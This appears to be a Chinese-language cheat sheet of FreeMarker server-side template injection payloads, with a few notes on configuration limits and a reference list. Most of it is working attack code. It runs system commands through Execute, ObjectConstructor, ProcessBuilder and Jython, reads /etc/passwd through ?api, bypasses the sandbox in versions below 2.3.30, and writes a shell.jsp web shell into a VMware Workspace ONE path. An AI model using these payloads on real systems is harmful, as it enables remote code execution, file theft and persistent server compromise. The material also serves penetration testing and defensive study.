```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ipconfig") }

${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","cmd","/c","ipconfig", ">", "D:/test/ipconfig.txt").start()}

<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>    // 依赖org.python.util.PythonInterpreter(org.python:jython-standalone)
```

还有一个payload:
> value?api 提供对 value 的 API（通常是 Java API）的访问，例如 value?api.someJavaMethod() 或 value?api.someBeanProperty。可通过 getClassLoader获取类加载器从而加载恶意类，或者也可以通过 getResource来实现任意文件读取。但是，当`api_builtin_enabled`为true时才可使用api函数，而该配置在2.3.22版本之后默认为false。

```java
<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
<#assign is=input?api.getInputStream()>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]
```

不过可能报错：
```
freemarker.core._MiscTemplateException: Can't use ?api, because the "api_builtin_enabled" configuration setting is false.
```

### 2.3.30以下的sanbox bypass
```
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

还有一个来自y4er:
```
${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileOutputStream","/opt/vmware/horizon/workspace/webapps/catalog-portal/shell.jsp").write("freemarker.template.utility.ObjectConstructor"?new()("java.lang.String","test").getBytes())}
```
根据这个修改一个freemarker的回显方式：
```
${"freemarker.template.utility.ObjectConstructor"?new()("java.util.Scanner", "freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder", "cmd", "/c", "ipconfig").start().getInputStream()).useDelimiter("\\A").next()}
```

### Ref
- https://www.cnblogs.com/nice0e3/p/16217471.html
- [服务器端模版注入SSTI分析与归纳](https://tttang.com/archive/1412/)
- [Apache Axis1（<=1.4版本） RCE](https://xz.aliyun.com/t/5513)
- [【最新漏洞预警】CVE-2022-22954 VMware Workspace ONE Access SSTI漏洞](https://mp.weixin.qq.com/s/X_E0zWONLVUQcgP6nZ78Mw)
- https://sp4zcmd.github.io/2021/09/01/FreeMarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#CVE-2019-9614
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker
